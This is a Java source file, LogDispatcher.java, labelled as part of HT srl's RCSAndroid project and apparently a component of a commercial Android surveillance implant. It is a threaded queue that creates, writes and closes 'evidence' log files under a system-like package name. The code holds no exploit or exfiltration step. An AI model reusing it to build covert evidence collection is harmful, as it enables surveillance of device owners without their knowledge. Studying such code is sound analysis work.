/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : LogDispatcher.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service;

import java.io.File;
import java.util.HashMap;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.locks.Condition;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

import android.util.Log;

import com.android.service.evidence.Evidence;
import com.android.service.file.Path;
import com.android.service.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class LogDispatcher.
 */
public class LogDispatcher extends Thread implements Runnable {

	/** The singleton. */
	private volatile static LogDispatcher singleton;

	/** The q. */
	private final BlockingQueue<Packet> queue;

	/** The log map. */
	private final HashMap<Long, Evidence> evidences;

	/** The halt. */
	private boolean halt;

	/** The sd dir. */
	private File sdDir;

	/** The lock. */
	final Lock lock = new ReentrantLock();

	/** The no logs. */
	final Condition noLogs = lock.newCondition();

	/** The TAG. */
	private final String TAG = "LogDispatcher";

	/*
	 * private BroadcastReceiver mExternalStorageReceiver; private boolean
	 * mExternalStorageAvailable = false; private boolean
	 * mExternalStorageWriteable = false;
	 */

	/**
	 * Instantiates a new log dispatcher.
	 */
	private LogDispatcher() {
		halt = false;

		queue = new LinkedBlockingQueue<Packet>();
		evidences = new HashMap<Long, Evidence>();
	}

	// Log name: QZM + 1 byte + 8 bytes + 4 bytes
	// QZA -> Signature
	// 1 byte -> Priority: 1 max - 255 min
	// 8 bytes -> Timestamp
	// 4 bytes -> .tmp while writing, .log when ready
	//
	// Markup name: QZM + 4 byte + 4 byte
	// QZM -> Signature
	// 4 bytes -> Log Type
	// 4 bytes -> .mrk
	/**
	 * Process queue.
	 */
	private void processQueue() {
		Packet p;
		// Log.d("QZ", TAG + " processQueue() Packets in Queue: " + q.size());

		if (queue.size() == 0) {
			return;
		}

		try {
			p = queue.take();
		} catch (final InterruptedException e) {
			e.printStackTrace();
			return;
		}

		switch (p.getCommand()) {
			case LogR.LOG_CREATE:
				createLog(p);
				break;

			case LogR.LOG_ATOMIC:
				atomicLog(p);
				break;

			case LogR.LOG_WRITE:
				writeLog(p);
				break;

			case LogR.LOG_CLOSE:
				closeLog(p);
				break;

			default:
				Log.d("QZ", TAG + " Error: " + "processQueue() got LOG_UNKNOWN");
				break;
		}

		return;
	}

	/**
	 * Self.
	 * 
	 * @return the log dispatcher
	 */
	public static LogDispatcher self() {
		if (singleton == null) {
			synchronized (LogDispatcher.class) {
				if (singleton == null) {
					singleton = new LogDispatcher();
				}
			}
		}

		return singleton;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Thread#run()
	 */
	@Override
	public void run() {
		Log.d("QZ", TAG + " LogDispatcher started");

		// Create log directory
		sdDir = new File(Path.logs());
		sdDir.mkdirs();

		// Debug - used to remove the directory
		// sdDir();

		while (true) {
			lock.lock();

			try {
				while (queue.size() == 0 && !halt) {
					noLogs.await();
				}

				// Halt command has precedence over queue processing
				if (halt == true) {
					queue.clear();
					evidences.clear();
					Log.d("QZ", TAG + " LogDispatcher closing");
					return;
				}

				processQueue();
			} catch (final InterruptedException e) {
				e.printStackTrace();
			} finally {
				lock.unlock();
			}
		}
	}

	/**
	 * Send.
	 * 
	 * @param packet
	 *            the packet
	 * @return true, if successful
	 */
	public synchronized boolean send(final Packet packet) {
		lock.lock();
		boolean added = false;

		try {
			added = queue.add(packet);

			if (added) {
				noLogs.signal();
			}
		} catch (final Exception e) {
			e.printStackTrace();
		} finally {
			lock.unlock();
		}

		return added;
	}

	/**
	 * Halt.
	 */
	public synchronized void halt() {
		lock.lock();

		try {
			halt = true;
			noLogs.signal();
		} finally {
			lock.unlock();
		}
	}


	/**
	 * Creates the log.
	 * 
	 * @param p
	 *            the p
	 * @return true, if successful
	 */
	private boolean createLog(final Packet p) {
		Check.ensures(!evidences.containsKey(p.getId()),
				"evidence already mapped");

		final byte[] additional = p.getAdditional();
		final Evidence evidence = new Evidence(p.getType());
		evidence.createEvidence(additional);
		evidences.put(p.getId(), evidence);

		return true;
	}

	/**
	 * Creates a simple log, copies the payload and closes it in one atomic
	 * step.
	 * 
	 * @param p
	 *            the p
	 */
	private void atomicLog(final Packet p) {
		Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped");

		final byte[] additional = p.getAdditional();
		final byte[] data = p.peek();
		final Evidence evidence = new Evidence(p.getType());
		
		evidence.createEvidence(additional);
		evidence.writeEvidence(data);
		evidence.close();
	}

	/**
	 * Write log.
	 * 
	 * @param p
	 *            the p
	 * @return true, if successful
	 */
	private boolean writeLog(final Packet p) {
		if (evidences.containsKey(p.getId()) == false) {
			Log.d("QZ", TAG + " Requested log not found");
			return false;
		}

		final Evidence evidence = evidences.get(p.getId());
		final boolean ret = evidence.writeEvidence(p.peek());
		
		return ret;
	}

	/**
	 * Close log.
	 * 
	 * @param p
	 *            the p
	 * @return true, if successful
	 */
	private boolean closeLog(final Packet p) {
		if (evidences.containsKey(p.getId()) == false) {
			Log.d("QZ", TAG + " Requested log not found");
			return false;
		}

		// Rename .tmp to .log
		final Evidence evidence = evidences.get(p.getId());
		evidence.close();

		return true;
	}


	/*
	 * Inserire un Intent-receiver per gestire la rimozione della SD private
	 * void updateExternalStorageState() { String state =
	 * Environment.getExternalStorageState(); if
	 * (Environment.MEDIA_MOUNTED.equals(state)) { mExternalStorageAvailable =
	 * mExternalStorageWriteable = true; } else if
	 * (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
	 * mExternalStorageAvailable = true; mExternalStorageWriteable = false; }
	 * else { mExternalStorageAvailable = mExternalStorageWriteable = false; }
	 * handleExternalStorageState(mExternalStorageAvailable,
	 * mExternalStorageWriteable); }
	 * 
	 * private void startWatchingExternalStorage() { mExternalStorageReceiver =
	 * new BroadcastReceiver() {
	 * 
	 * @Override public void onReceive(Context context, Intent intent) {
	 * Log.i("test", "Storage: " + intent.getData());
	 * updateExternalStorageState(); } }; IntentFilter filter = new
	 * IntentFilter(); filter.addAction(Intent.ACTION_MEDIA_MOUNTED);
	 * filter.addAction(Intent.ACTION_MEDIA_REMOVED);
	 * registerReceiver(mExternalStorageReceiver, filter);
	 * updateExternalStorageState(); }
	 * 
	 * private void stopWatchingExternalStorage() {
	 * unregisterReceiver(mExternalStorageReceiver); }
	 */
}
